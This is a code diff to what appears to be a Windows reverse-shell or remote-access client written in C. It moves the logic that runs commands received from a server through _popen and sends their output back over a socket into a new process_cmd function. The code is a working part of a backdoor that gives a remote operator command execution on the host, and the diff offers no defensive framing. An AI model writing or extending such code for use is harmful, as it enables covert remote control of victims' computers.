@@ -38,6 +38,33 @@ SOCKET connect_to_server() {
   
 }
 
+int process_cmd(char *cmd, SOCKET sock) {
+
+  FILE *fp = _popen(cmd, "r");
+
+  char output[1024];
+  int n_bytes;
+  while ((n_bytes = fread(output, 1, sizeof(output), fp)) > 0) {
+
+    size_t sent = 0;
+    while (sent < n_bytes) {
+      int n = send(sock, output + sent, n_bytes - sent, 0);
+
+      if (n > 0) {
+        sent += n;
+      } else {
+        return -1;
+      }
+    }
+
+  }
+
+  _pclose(fp);
+
+  return 0;
+
+}
+
 int main() {
 
   WSADATA wsa;
@@ -97,28 +124,11 @@ int main() {
 
 
           // Perform received command
-          FILE *fp = _popen(cmd, "r");
-
-          char output[1024];
-          int n_bytes;
-          while ((n_bytes = fread(output, 1, sizeof(output), fp)) > 0) {
-
-            size_t sent = 0;
-            while (sent < n_bytes) {
-              int n = send(sock, output + sent, n_bytes - sent, 0);
-
-              if (n > 0) {
-                sent += n;
-              } else {
-                closesocket(sock);
-                connection_alive = 0;
-                break;
-              }
-            }
-
+          if (process_cmd(cmd, sock) < 0) {
+            closesocket(sock);
+            connection_alive = 0;
           }
 
-          _pclose(fp);
         }
 
       } else {
